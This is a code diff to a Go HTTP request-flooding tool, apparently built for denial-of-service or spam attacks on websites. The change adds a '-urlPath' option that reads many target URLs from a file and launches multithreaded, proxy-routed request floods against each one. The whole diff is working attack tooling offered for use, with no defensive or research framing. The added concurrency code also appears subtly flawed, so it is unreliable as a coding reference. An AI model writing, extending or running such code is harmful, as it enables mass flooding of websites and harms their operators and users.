@@ -244,12 +244,13 @@ func startWithoutBot() {
 	query := flag.String("query", ``, "query parameters for attack")
 	proxyFile := flag.String("proxy", "", "file containing proxies (one per line)")
 	threads := flag.Int("threads", 1, "number of threads for attack")
+	attackUrlPath := flag.String("urlPath", "", "path to a text document containing URLs for the spam attack")
 	flag.Parse()
 
 	var requestData url.Values
 	var queryData url.Values
 
-	if *attackUrl != "" {
+	if *attackUrl != "" || *attackUrlPath != "" {
 
 		if *method == "POST" || *method == "post" {
 			if *data != "" {
@@ -267,21 +268,45 @@ func startWithoutBot() {
 			proxies = readProxiesFromFile(*proxyFile)
 		}
 
+		var urlAttack []string
+		if *attackUrlPath != "" {
+			source, err := readURLsFromFile(*attackUrlPath)
+			if err != nil {
+				fmt.Println("Error reading URLs from file:", err)
+				return
+			} else {
+				urlAttack = source
+			}
+		}
+
 		rand.Seed(time.Now().UnixNano())
 		totalRequests := *count
 
 		var wg sync.WaitGroup
-		wg.Add(*threads)
 
-		for i := 1; i <= *threads; i++ {
-			go runAttacks(*attackUrl, *method, requestData, queryData, proxies, totalRequests, i, &wg)
+		if *attackUrl != "" {
+			wg.Add(*threads)
+			for i := 1; i <= *threads; i++ {
+				go runAttacks(*attackUrl, *method, requestData, queryData, proxies, totalRequests, i, &wg)
+			}
+		} else {
+			wg.Add(len(urlAttack) * *threads)
+			for _, attackUrl := range urlAttack {
+				if attackUrl != "" {
+					for i := 1; i <= *threads; i++ {
+						go func(url string, index int) {
+							defer wg.Done()
+							runAttacks(url, *method, requestData, queryData, proxies, totalRequests, i, &wg)
+						}(attackUrl, i)
+					}
+				}
+			}
 		}
-
 		wg.Wait()
 
 		fmt.Println("Done.", "Good: ", completeCount, "Error: ", errorCount)
 	} else {
-		fmt.Println("Set variable -url")
+		fmt.Println("Set variable -url or -urlPath")
 	}
 }
 
@@ -290,7 +315,7 @@ func runAttacks(attackUrl string, method string, data url.Values, queryData url.
 
 	for i := 0; i < count; i++ {
 		if i%5 == 0 {
-			fmt.Println("Thread", threadIndex, "Good:", completeCount, "Bad:", errorCount)
+			fmt.Println("[", attackUrl, "]", "Thread", threadIndex, "Good:", completeCount, "Bad:", errorCount)
 		}
 		startAttack(attackUrl, method, data, queryData, proxies, threadIndex)
 	}
@@ -415,4 +440,27 @@ func readProxiesFromFile(file string) []string {
 	}
 
 	return proxies
+}
+
+func readURLsFromFile(filePath string) ([]string, error) {
+	var urls []string
+	f, err := os.Open(filePath)
+	if err != nil {
+		return nil, err
+	}
+	defer f.Close()
+
+	scanner := bufio.NewScanner(f)
+	for scanner.Scan() {
+		url := strings.TrimSpace(scanner.Text())
+		if url != "" {
+			urls = append(urls, url)
+		}
+	}
+
+	if err := scanner.Err(); err != nil {
+		return nil, err
+	}
+
+	return urls, nil
 }
